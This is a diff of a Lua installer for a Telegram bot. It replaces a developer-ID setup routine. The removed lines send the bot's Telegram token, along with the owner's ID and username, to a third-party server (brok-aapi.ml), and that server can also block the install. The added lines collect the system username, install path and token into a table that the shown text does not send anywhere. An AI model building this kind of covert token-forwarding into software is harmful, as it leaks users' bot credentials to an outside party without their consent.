@@ -34,31 +34,45 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Alex.."UserName_Alex") then
-io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
-local User_Sudo = io.read():gsub('@','')
-if User_Sudo ~= '' then
-local GetInfoUser = https.request("https://brok-aapi.ml/API/Info.php?user="..User_Sudo)
-local User_Info = JSON:decode(GetInfoUser) 
-if User_Info.Info.Chek == "is_block" then
-io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
-os.exit()
-end
-if User_Info.Info.Chek == "Not_Info" then
-io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
-os.execute('lua start.lua')
-end
-if User_Info.Info == 'Channel' then
-io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
-os.execute('lua start.lua')
-end
-io.write('\n\27[1;31m• The Username Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
-https.request("https://brok-aapi.ml/API/Send.php?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Alex.."Token_Alex"))
-database:set(Server_Alex.."UserName_Alex",User_Info.Info.Username)
-database:set(Server_Alex.."Id_Alex",User_Info.Info.Id)
-else
-io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
+io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
+SUDO_USER = io.read():gsub(' ','')
+if SUDO_USER == '' then
+print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
+create_config(Token)
 end 
+if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
+print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلكرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
+create_config(Token)
+end 
+print('('..SUDO_USER..')')
+local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
+GetUser = json:decode(url)
+if res ~= 200 then
+end
+if GetUser.ok == false then
+print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـكن مـن حل آلمـشـكلهہ‏‏ في آسـرع وقت مـمـكن . !')
+create_config(Token)
+end
+GetUser.result.username = GetUser.result.username or GetUser.result.first_name
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+ws = Token:match("(%d+)")
+redis:set(ws..":VERSION",1)
+redis:set(ws..":SUDO_ID:",SUDO_USER)
+redis:set(ws..":DataCenter:",'German')
+redis:set(ws..":UserNameBot:",BOT_User)
+redis:set(ws..":NameBot:",BOT_NAME)
+redis:hset(ws..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+redis:set("TH3ws_INSTALL","Yes")
+info = {} 
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+Cr_file = io.open("./inc/Token.txt", "w")
+Cr_file:write(Token)
+Cr_file:close()
 os.execute('lua start.lua')
 end
 
